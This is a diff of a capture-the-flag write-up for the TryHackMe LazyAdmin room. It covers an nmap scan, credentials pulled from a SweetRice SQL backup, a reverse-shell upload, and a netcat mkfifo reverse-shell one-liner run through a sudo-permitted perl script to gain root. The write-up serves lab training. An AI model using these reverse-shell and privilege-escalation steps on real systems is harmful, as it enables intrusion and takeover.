@@ -1,5 +1,8 @@
-# Nmap 7.93 scan initiated Thu Jan 12 23:21:31 2023 as: nmap -sV -A -p 80,22 -vvv -oN README.md 10.10.168.148
+# Reconnaissance
+
 ```
+Nmap 7.93 scan initiated Thu Jan 12 23:21:31 2023 as: nmap -sV -A -p 80,22 -vvv -oN README.md 10.10.168.148
+
 Nmap scan report for 10.10.168.148
 Host is up, received echo-reply ttl 63 (0.21s latency).
 Scanned at 2023-01-12 23:21:38 EST for 25s
@@ -75,16 +78,17 @@ $ip/content/as
 [--------------------] - 0s         0/30000   0/s     http://10.10.31.94/content/as/lib/ 
 ```
 
+
+once I am able to log in to the webserver, I go to ads page and upload a reverse shell
+
 ### upon getting the backup sql, and inspecting i am able to get admin and password
 ```
 cat mysql_bakup_20191129023059-1.5.1.sql | grep -ir pass
 mysql_bakup_20191129023059-1.5.1.sql:  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
 ```
-### 10.10.31.94/content
+### inside the 10.10.31.94/content directory I was able to get this credentials
 user: manager
 pass: Password123
-
-once I am able to log in to the webserver, I go to ads page and upload a reverse shell
 
 ### i used searchploit to get the sweetrice exploit
 
@@ -119,16 +123,16 @@ $ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.70.19 5554 >
 $ sudo /usr/bin/perl /home/itguy/backup.pl
 
 # I created another listening port and upon running I am successfully become root
-
+```
 ┌──(aaron㉿kali)-[~/thm/lazyadmin]
 └─$ nc -lnvp 5554
 listening on [any] 5554 ...
 connect to [10.18.70.19] from (UNKNOWN) [10.10.129.83] 35054
 /bin/sh: 0: can't access tty; job control turned off
-# whoami
+whoami
 root
-# cd /
-# ls
+ cd /
+ls
 bin
 boot
 cdrom
@@ -144,3 +148,4 @@ cat: root/txt: No such file or directory
 # cat root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 # 
+```
